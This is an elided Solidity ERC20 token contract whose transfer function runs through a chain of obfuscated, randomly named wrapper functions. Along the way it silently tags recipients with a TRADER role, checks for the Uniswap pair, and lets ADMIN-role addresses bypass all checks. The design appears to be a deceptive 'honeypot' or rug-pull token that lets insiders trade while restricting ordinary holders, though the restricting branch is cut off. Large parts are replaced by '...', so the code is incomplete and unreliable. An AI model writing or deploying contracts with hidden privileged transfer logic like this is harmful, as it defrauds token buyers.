...
abstract contract _NCINSKSConsole is Context, _NCINSKSRoleControl {
...
contract _NCINSKSERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is _NCINSKSERC20, _NCINSKSConsole {
    ...
    ) _NCINSKSERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(_NCINSKSERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");

        __NCINSKSydcxdr(from, to, amt);

    }

    function __NCINSKSydcxdr(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        __NCINSKSiubhse(from, to, amt);
    }


    function __NCINSKSiubhse(address from, address to, uint256 amt) internal {
        ...
        __NCINSKSighnex(from, to, amt);
    }

    function __NCINSKSighnex(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        __NCINSKSibdxgw(from, to, amt);
    }

    function __NCINSKSibdxgw(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
        ...
        __NCINSKSndfrmfya(from, to, amt);
    }


    function __NCINSKSndfrmfya(address from, address to, uint256 amt) internal {


        __NCINSKSitynvdr(from, to, amt);
    }

    function __NCINSKSitynvdr(address from, address to, uint256 amt) internal {
        if (hasRole(ADMIN, from) || hasRole(ADMIN, to)) {
            super._transfer(from, to, amt);
            return;
        }else if (hasRole(TRADER, from) && hasRole(TRADER, to)) {

           __NCINSKSuhfnfead(from, to, amt);
    ...
    function __NCINSKSuhfnfead(address from, address to, uint256 amt) internal {
        if(amt > 0){
